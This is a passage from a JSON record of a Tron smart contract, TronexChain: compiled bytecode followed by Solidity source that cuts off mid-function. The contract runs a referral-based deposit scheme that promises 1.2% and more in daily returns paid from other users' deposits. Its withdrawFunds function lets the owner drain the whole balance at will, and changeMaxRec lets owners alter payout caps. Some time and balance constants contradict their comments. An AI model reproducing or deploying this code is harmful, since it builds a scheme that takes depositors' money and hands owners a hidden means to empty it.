73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154115b15612518576000600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015490508181600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015401111561251157600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b8083019250505b80600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201541080156125ab57506000600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b15612692576000600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015401111561268b57600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b8083019250505b80600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201541015156126e8576000925050506126ee565b81925050505b919050565b600881565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806127a05750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515612814576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b8060048190555050565b607881565b600080600090506000809050600062989680600b5481151561284157fe5b04905060328111151561285d5760028102925060009150612877565b6064925060026064600283020381151561287357fe5b0491505b600082840190508060780194505050505090565b6298968081565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b15801561294457600080fd5b505afa158015612958573d6000803e3d6000fd5b505050506040513d602081101561296e57600080fd5b81019080805190602001909291905050509050600061298b613468565b905081600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601541015612b6e57600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015461271060b4600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff1664ffffffffff164203811515612a8557fe5b0483600860008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501540202811515612ad557fe5b040392508183600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154011115612b6d57600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154820392505b5b50915091565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b600080600080600080600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010154600860008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060080154600860008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060090154600860008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0154600860008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0154600860008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015495509550955095509550955091939550919395565b60065481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480612e1a5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b80612e725750600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515612ee6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000806004541115612f4e5760646004548302811515612f4657fe5b049050612f62565b606461012c8302811515612f5e57fe5b0490505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806130345750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b15156130a8576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600c5481565b60045481565b60086020528060005260406000206000915090508060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060010154908060020154908060030154908060040154908060050154908060060154908060070160009054906101000a900464ffffffffff169080600801549080600901549080600a01549080600b01549080600c015490508d565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6009818154811015156131c357fe5b9060005260206000209060209182820401919006915054906101000a900460ff1681565b600042905090565b60055481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16148061329d5750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b806132f55750600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b1515613369576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b80600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080600090506000809050600062989680600b548115156133f157fe5b04905060328111151561340d5760028102925060009150613427565b6064925060026064600283020381151561342357fe5b0491505b600082840190508094505050505090565b600b5481565b6298968081565b600a5481565b613455338261374e565b61345f3334613b8c565b50565b60075481565b600080600090506000809050600062989680600b5481151561348657fe5b0490506032811115156134a257600281029250600091506134bc565b606492506002606460028302038115156134b857fe5b0491505b600082840190508060780194505050505090565b6000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b6009805490508160ff16101561374857600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561358757613748565b6001810160ff16600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600101541015156136d6576000606460098360ff168154811015156135ee57fe5b90600052602060002090602091828204019190069054906101000a900460ff1660ff16850281151561361c57fe5b04905080600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600401600082825401925050819055508473ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f16e746f9be6c4b545700b04df27afb9fceabf59b94ef1c816e78a435059fabea836040518082815260200191505060405180910390a3505b600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169150808060010191505061353d565b50505050565b600073ffffffffffffffffffffffffffffffffffffffff16600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614801561381857508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614155b801561387157506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b801561392e57506000600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff1664ffffffffff16118061392d57506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b5b15613b885780600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600860008273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600101600081548092919060010191905055508073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167f9f4d150e5193cfa9a87226111d3b60b624d97ccc056eeeac1569af1ea27bf64160405160405180910390a3600a6000815480929190600101919050555060008090505b6009805490508160ff161015613b8657600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415613ac257613b86565b600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600a0160008154809291906001019190505550600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691508080600101915050613a78565b505b5050565b600073ffffffffffffffffffffffffffffffffffffffff16600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141580613c7657506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b1515613cea576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260098152602001807f4e6f2075706c696e65000000000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff1664ffffffffff161115613faf573073ffffffffffffffffffffffffffffffffffffffff16638959af3c600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b158015613dfc57600080fd5b505afa158015613e10573d6000803e3d6000fd5b505050506040513d6020811015613e2657600080fd5b8101908080519060200190929190505050600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002015410151515613ef0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f4465706f73697420616c7265616479206578697374730000000000000000000081525060200191505060405180910390fd5b600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501548110151515613faa576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b61402b565b62989680811015151561402a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600a8152602001807f42616420616d6f756e740000000000000000000000000000000000000000000081525060200191505060405180910390fd5b5b6000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206002018190555080600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501819055506000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601819055506001600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c018190555042600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160006101000a81548164ffffffffff021916908364ffffffffff16021790555080600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206008016000828254019250508190555080600b600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff167f2cb77763bc1e8490c1a904905c4d74b4269919aca114464f4bb4d911e60de364826040518082815260200191505060405180910390a26000600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060008090505b6001600554038160ff1610156143d457600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415614312576143d4565b82600860008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600b0160008282540192505081905550600860008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16915080806001019150506142c8565b50600073ffffffffffffffffffffffffffffffffffffffff16600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415156146055760646008830281151561447c57fe5b0460086000600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600301600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff16600860008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fba5b08f0cddc64825b52c35c09323af810c1d2e29c97aba01a4ed25cfdc482d16064600886028115156145ee57fe5b046040518082815260200191505060405180910390a35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e8600654850281151561465157fe5b049081150290604051600060405180830381858888f1935050505015801561467d573d6000803e3d6000fd5b50600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e860075485028115156146cb57fe5b049081150290604051600060405180830381858888f193505050501580156146f7573d6000803e3d6000fd5b50600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6103e8600754850281151561474557fe5b049081150290604051600060405180830381858888f19350505050158015614771573d6000803e3d6000fd5b5050505056fea165627a7a72305820e56d43b3c7120f443c9cfb27da9ab5473407ee28b58a164aa9a698f0680bf0c60029",
  "source": "pragma solidity 0.5.4;\r\n\r\ncontract TronexChain {\r\n\r\n    struct User {\r\n        address upline;\r\n        uint256 referrals;\r\n        uint256 payouts;\r\n        uint256 direct_bonus;\r\n        uint256 gen_bonus;\r\n        uint256 deposit_amount;\r\n        uint256 deposit_payouts;\r\n        uint40 deposit_time;\r\n        uint256 total_deposits;\r\n        uint256 total_payouts;\r\n        uint256 total_structure;\r\n\t\tuint256 team_biz;\r\n        uint256 isActive;\r\n    }\r\n\r\n    address payable public owner;\r\n    address payable public alt_owner;\r\n    address payable public fee1;\r\n    address payable public fee2;\r\n\tuint256 public max_receivable  = 0;\r\n \r\n    uint256 constant public CONTRACT_BALANCE_STEP = 10 trx; // 1000000 trx\r\n    uint256 constant public MIN_DEPOSIT = 10 trx; // 50 trx\r\n    uint256 constant public TIME_STEP = 180 ; // 1 days\r\n  \r\n    uint256 constant public aff_bonus = 8 ; // 8 percent\r\n \tuint256 public team_levels = 30 ;\r\n    uint256 public promo_fee  = 100 ;   \r\n    uint256 public admin_fee  = 25  ;   \r\n    uint256 constant public BASE_PERCENT = 120 ; // 1.2% daily (MULTIPLIER 100)\r\n\tuint256 constant public PERCENTS_DIVIDER = 10000; \r\n  \r\n    mapping(address => User) public users;\r\n\r\n    uint8[] public ref_bonuses;  \r\n    uint256 public total_users = 1;\r\n    uint256 public total_deposited;\r\n    uint256 public total_withdraw;\r\n    \r\n    event Upline(address indexed addr, address indexed upline);\r\n    event NewDeposit(address indexed addr, uint256 amount);\r\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n    event LimitReached(address indexed addr, uint256 amount);\r\n\r\n    constructor(address payable _owner, address payable _alt_owner, address payable _fee1, address payable _fee2) public {\r\n        owner = _owner;\r\n\t\talt_owner = _alt_owner;\r\n        fee1 = _fee1;\r\n        fee2 = _fee2;\r\n         \r\n        ref_bonuses.push(30);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);  // 50\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);  // 75 \r\n    }\r\n \r\n    function _setUpline(address _addr, address _upline) private {\r\n        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && \r\n\t\t(users[_upline].deposit_time > 0 || _upline == owner) ) {\r\n            users[_addr].upline = _upline;\r\n            users[_upline].referrals++;\r\n\r\n            emit Upline(_addr, _upline);\r\n\r\n            total_users++;\r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                if(_upline == address(0)) break; \r\n                users[_upline].total_structure++; \r\n                _upline = users[_upline].upline;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deposit(address _addr, uint256 _amount) private {\r\n        require(users[_addr].upline != address(0) || _addr == owner, \"No upline\");\r\n\r\n        if(users[_addr].deposit_time > 0) {\r\n             \r\n            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), \"Deposit already exists\");\r\n            require(_amount >= users[_addr].deposit_amount  , \"Bad amount\");\r\n        }\r\n        else require(_amount >= MIN_DEPOSIT  , \"Bad amount\");\r\n        \r\n        users[_addr].payouts = 0;\r\n        users[_addr].deposit_amount = _amount;\r\n        users[_addr].deposit_payouts = 0;\r\n        users[_addr].isActive = 1;\r\n        users[_addr].deposit_time = uint40(block.timestamp);\r\n        users[_addr].total_deposits += _amount;\r\n \r\n        total_deposited += _amount;\r\n        \r\n        emit NewDeposit(_addr, _amount);\r\n\r\n\t\taddress _upline = users[_addr].upline;\r\n\r\n\t\t for(uint8 i = 0; i < team_levels - 1; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].team_biz += _amount; \r\n                _upline = users[_upline].upline;\r\n            }\r\n\r\n        if(users[_addr].upline != address(0)) {\r\n            users[users[_addr].upline].direct_bonus += _amount*aff_bonus/100;\r\n\r\n            emit DirectPayout(users[_addr].upline, _addr,  _amount*aff_bonus/100);\r\n        } \r\n         \r\n         owner.transfer(_amount * promo_fee / 1000); \r\n         fee1.transfer(_amount * admin_fee / 1000); \r\n         fee2.transfer(_amount * admin_fee / 1000); \r\n    }\r\n\r\n     function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = users[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            if(users[up].referrals >= i + 1) {\r\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n                \r\n                users[up].gen_bonus += bonus;\r\n\r\n                emit MatchPayout(up, _addr, bonus);\r\n            }\r\n\r\n            up = users[up].upline;\r\n        }\r\n    }\r\n \r\n    function deposit(address _upline) payable external {\r\n        _setUpline(msg.sender, _upline);\r\n        _deposit(msg.sender, msg.value);\r\n    }\r\n\r\n \r\n    function withdraw() external {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\r\n        \r\n        require(users[msg.sender].payouts < max_payout, \"Full payouts\");\r\n\r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[msg.sender].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].deposit_payouts += to_payout;\r\n            users[msg.sender].payouts += to_payout;\r\n\r\n            _refPayout(msg.sender, to_payout);\r\n        }\r\n        \r\n        // Direct payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\r\n\r\n            if(users[msg.sender].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].direct_bonus -= direct_bonus;\r\n            users[msg.sender].payouts += direct_bonus;\r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[msg.sender].gen_bonus;\r\n\r\n            if(users[msg.sender].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].gen_bonus -= gen_bonus;\r\n            users[msg.sender].payouts += gen_bonus;\r\n            to_payout += gen_bonus;\r\n        }\r\n\r\n        require(to_payout > 0, \"Zero payout\");\r\n        \r\n        users[msg.sender].total_payouts += to_payout;\r\n        total_withdraw += to_payout;\r\n\r\n        msg.sender.transfer(to_payout);\r\n\r\n        emit Withdraw(msg.sender, to_payout);\r\n\r\n        if(users[msg.sender].payouts >= max_payout) {\r\n            emit LimitReached(msg.sender, users[msg.sender].payouts);\r\n            users[msg.sender].isActive = 0;\r\n        }\r\n    }\r\n    \r\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {\r\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n\t\tuint256 total_rate = getTotalRate();\r\n\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n    }\r\n\r\n    function getUserDividends(address _addr) view external returns(uint256) {\r\n      uint256  max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n      uint256 total_rate = getTotalRate();\r\n      uint256 payout;\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; \r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n        return payout;\r\n    }   \r\n \r\n\tfunction getTotalRate() internal view returns(uint256) {\r\n\t \r\n \t\tuint256 step1 = 0;\r\n\t\tuint256 step2 = 0;\r\n\t\tuint256 steps =  total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n\r\n\t\treturn BASE_PERCENT+total_step ;\r\n\t}\r\n\r\n    /*\r\n        Only external call\r\n    */\r\n\r\n\r\n\tfunction getContractBalance() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t} \r\n\r\n    function getTotalSteps( uint256 _balance) external pure returns(uint256) {\r\n     \r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 balance_trx = _balance*1000000; \r\n        uint256 steps =  balance_trx/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n \r\n        return total_step ;\r\n    }\r\n\r\n\r\n\tfunction getRate() external view returns(uint256) {\r\n\t \r\n        uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 steps =  total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2;\r\n         \r\n        return BASE_PERCENT+total_step ;\r\n\t}\r\n\r\n    function getContractBonus() external view returns(uint256) {\r\n     \r\n         uint256 step1 = 0;\r\n        uint256 step2 = 0;\r\n        uint256 steps = total_deposited/CONTRACT_BALANCE_STEP ;\r\n\r\n         if(steps <= 50){\r\n             step1 = steps*2;\r\n             step2 = 0; \r\n         } else {\r\n             step1 = 100;\r\n             step2 = (steps*2 - 100)/2;\r\n         }\r\n         uint256 total_step = step1 + step2; \r\n        return total_step ;\r\n    }\r\n\r\n\r\n    function maxPayoutOf(uint256 _amount) external view returns(uint256) {\r\n\t\tif(max_receivable > 0){\r\n\t\t\treturn  _amount * max_receivable / 100;\r\n\t\t} else {\r\n        return \t_amount * 300 / 100; \r\n\t\t}\r\n    }\r\n \r\n\r\n\tfunction getUserBalance(address _addr) external view returns (uint256) {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr); \r\n \r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[_addr].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[_addr].payouts;\r\n            } \r\n         }\r\n        \r\n        // Direct payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[_addr].direct_bonus;\r\n\r\n            if(users[_addr].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n           \r\n            to_payout += direct_bonus;\r\n        } \r\n       \r\n        // Match payout\r\n        if(users[_addr].payouts < max_payout && users[_addr].gen_bonus > 0) {\r\n            uint256 gen_bonus = users[_addr].gen_bonus;\r\n\r\n            if(users[_addr].payouts + gen_bonus > max_payout) {\r\n                gen_bonus = max_payout - users[_addr].payouts;\r\n            } \r\n            to_payout += gen_bonus;\r\n        } \r\n \r\n        if(users[_addr].payouts >= max_payout) {\r\n\t\t\treturn 0;       \r\n\t\t } else {\r\n\t\t\t return to_payout;\r\n\t\t }\r\n    }\r\n  \r\n\tfunction changeMaxRec(uint256 _maxRecPercent) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\tmax_receivable = _maxRecPercent;\r\n\t} \r\n\r\n\tfunction withdrawFunds() public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner.transfer(address(this).balance);\r\n\t} \r\n\r\n\tfunction changeAdmin(address payable _newAdmin) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner, \"Not allowed\");\r\n\t\towner = _newAdmin;\r\n\t} \r\n \r\n    function changeFee1(address payable _newfee1) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner || msg.sender == fee1  , \"Not allowed\");\r\n\t\tfee1 = _newfee1;\r\n\t} \r\n \r\n    function changeFee2(address payable _newfee2) public {\r\n\t\trequire(msg.sender == owner || msg.sender == alt_owner ||  msg.sender == fee2 , \"Not allowed\");\r\n\t\tfee2 = _newfee2;\r\n\t}  \r\n   \r\n    function getAdmin() external view returns (address){ \r\n        return owner;\r\n    } \r\n\r\n     function getNow() external view returns (uint256){ \r\n        return block.timestamp;\r\n    }\r\n\r\n    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus, uint256 user_status  ) {\r\n        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus, users[_addr].isActive  );\r\n    }\r\n\r\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 